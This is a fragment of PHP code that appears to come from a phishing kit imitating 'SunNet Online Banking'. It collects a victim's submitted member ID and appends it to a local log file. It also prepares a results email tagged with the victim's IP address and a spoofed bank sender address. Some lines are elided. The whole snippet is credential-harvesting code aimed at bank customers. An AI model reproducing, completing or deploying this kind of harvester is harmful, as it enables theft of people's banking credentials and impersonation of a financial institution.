...
$message = "--------------SunNet Online Banking Result-------------------\n";
$message .= "Member ID: ".$_POST['UserName']."\n";
...
$fp = fopen('../sunnet.txt', 'a');
fwrite($fp, $message);
fclose($fp);


$subject = "SunNet Online Banking ReZulT | $ip";
$headers = "From: SunNet Online Banking Result <customer@sunnet.com>\n";
